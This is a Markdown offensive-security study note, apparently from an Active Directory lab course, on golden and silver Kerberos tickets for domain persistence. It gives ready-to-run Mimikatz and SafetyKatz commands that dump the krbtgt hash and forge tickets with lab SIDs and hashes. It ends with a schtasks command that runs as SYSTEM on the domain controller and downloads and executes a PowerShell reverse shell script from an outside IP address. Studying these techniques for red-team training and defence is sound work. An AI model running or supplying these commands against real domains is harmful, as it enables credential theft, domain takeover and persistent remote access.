# Domain Persistence - Golden / Silver tickets

- [Domain Persistence - Golden / Silver tickets](#domain-persistence---golden--silver-tickets)
  - [AD Domain Dominance](#ad-domain-dominance)
  - [Golden Ticket](#golden-ticket)
  - [Leverage Golden Ticket](#leverage-golden-ticket)
  - [Silver Ticket](#silver-ticket)
  - [Leverage Silver Ticket](#leverage-silver-ticket)

---

## AD Domain Dominance

There is much more to Active Directory than "just" the Domain Admin. We must have multiple ways of persisting with high privileges in AD. That is, we must have the ability to have on-demand Domain Admin. Let's discuss Domain level persistence.

<br/>

## Golden Ticket

![picture 42](images/2c50434a29a022e1310695f228809b2d9769b549f0a484b31b30a054d518f2f2.png)  

From the above, it assumes that:
- All TGTs signed by `krbtgt` hash are valid

<br/>

A **golden ticket** is signed and encrypted by the hash of krbtgt account **which makes it a valid TGT ticket**. 

Since user account validation is not done by Domain Controller (KDC service) until TGT is older than **20 minutes**, we can use even deleted/revoked/non-existent accounts.

The `krbtgt` user hash could be used to impersonate any user with any privileges from even a non-domain machine. Single password change has no effect on this attack as password history is maintained for the account.

<br/>

Reference:
- https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf
- http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html

<br/>

## Leverage Golden Ticket

Execute mimikatz on DC to get krbtgt hash:

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

or

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

To impersonate, on a machine which can reach the DC over network:

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

<br/>

Alternatively, we can use `SafetyKatz`:

```
C:\Users\Public\SafetyKatz.exe "lsadump::lsa /patch" "exit"
```

or

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

On a machine which can reach the DC over network (Need elevation):

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<br/>

|Mimikatz Parameters | |
|--|--|
|`kerberos::golden` | Name of the module |
|`/User:Administrator` | Username for which the TGT is generated |
|`/domain:us.techcorp.local` | Domain FQDN |
|`/sid:S-1-5-21-210670787-2521448726-163245708` | SID of the domain |
|`/krbtgt:b0975ae49f441adc6b024ad238935af5` | NTLM (RC4) hash of krbtgt. Alternatively you can use `/aes128` or `/aes256` for AES keys. |
|`/id:500 /groups:512` | Opertional User RID (default `500`) and Group (default `513` `512` `520` `518` `519`). |
|`/ptt` | Injects the ticket in current PowerShell process - no need to save the ticket on disk. |
|`/ticket` | Saves the ticket to a file for later use |
|`/startoffset:0` | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future. |
|`/endin:600` | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes. |
|`/renewmax:10080` | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

<br/>

---

## Silver Ticket

![picture 49](images/501e7b83aa8e72f3262f2d4330bde36330b9a5464c77e44ca06fb67a317d4466.png)  

- Note the TGS is encrypted by target service account's NTLM

<br/>

**Silver Ticket** is a valid **TGS** encrypted and signed by the **NTLM hash of the service account** (Golden ticket is signed by hash of krbtgt) of the service running with that account.

Services rarely check **PAC (Privileged Attribute Certificate)**. Services will allow access only to the services themselves.

It has a reasonable persistence period (default 30 days for computer accounts).

<br/>

## Leverage Silver Ticket

Using hash of the Domain Controller computer account, below command provides **access to shares** on the DC.

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:cifs /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, WSMAN and many more. We can use others tools that we discussed for similar results.

List of SPN:
- List of SPNs: https://adsecurity.org/?page_id=183

Useful list of services:
- https://adsecurity.org/?p=2011

<br/>

| Mimikatz Parameters | |
|--|--|
|`kerberos::golden` | Name of the module (there is no Silver module!) |
|`/user:administrator` | Username for which the TGT is generated |
|`/domain:us.techcorp.local` | Domain FQDN |
|`/sid:S-1-5-21-738119705-704267045-3387619857` | Domain SID |
|`/target:us-dc.us.techcorp.local` | Target server FQDN |
|`/service:cifs` | The SPN name of the service for which TGS is to be created |
|`/rc4:9ebf9c00ce2ce54af48fd03f4a7039c5` | NTLM (RC4) of the service account. You may use `/aes128`, `/aes256` in case of AES key. |
|`/id:500 /groups:512` | Optional User RID (default 500) and Group (default 513 512 520 518 519) |
|`/ptt` | Injects the ticket in current PowerShell process - no need to save the ticket on disk |
|`/startoffset:0` | Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future |
|`/endin:600` | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
|`/renewmax:10080` | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |

<br/>

There are various ways of achieving command execution using Silver tickets. 

Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:

```
Invoke-Mimikatz -Command '"kerberos::golden
/User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /rc4:f4492105cb24a843356945e45402073e /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

Then schedule and execute a task:

```
schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.64:808 0/Invoke-PowerShellTcp.ps1''')'"
```

```
schtasks /Run /S us-dc.us.techcorp.local /TN "STCheck"
```

<br/>

